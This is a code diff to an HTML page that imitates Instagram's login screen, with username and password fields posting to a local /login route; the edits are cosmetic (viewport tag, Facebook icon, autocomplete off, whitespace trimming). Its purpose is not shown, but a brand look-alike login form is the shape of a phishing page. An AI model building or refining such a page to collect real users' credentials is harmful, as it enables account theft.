@@ -2,6 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <link rel="stylesheet" href="/static/style.css">
 </head>
@@ -10,12 +11,15 @@
         <div class="lang-selector">English <span>v</span></div>
         <h1 class="logo">Instagram</h1>
         
-        <button class="btn-fb">Continue with Facebook</button>
+        <button class="btn-fb">
+            <span class="fb-icon">f</span> Continue with Facebook
+        </button>
+        
         <div class="or-divider">OR</div>
         
         <form action="/login" method="POST">
-            <input type="text" id="userInput" name="username" placeholder="Phone number, username, or email">
-            <input type="password" id="passInput" name="password" placeholder="Password">
+            <input type="text" id="userInput" name="username" placeholder="Phone number, username, or email" autocomplete="off">
+            <input type="password" id="passInput" name="password" placeholder="Password" autocomplete="off">
             <a href="#" class="forgot">Forgot password?</a>
             <button type="submit" class="btn-login" id="loginBtn" disabled>Log In</button>
         </form>
@@ -29,7 +33,7 @@
         const button = document.getElementById('loginBtn');
 
         function checkInputs() {
-            if (email.value.length > 0 && password.value.length > 0) {
+            if (email.value.trim().length > 0 && password.value.trim().length > 0) {
                 button.classList.add('active');
                 button.disabled = false;
             } else {
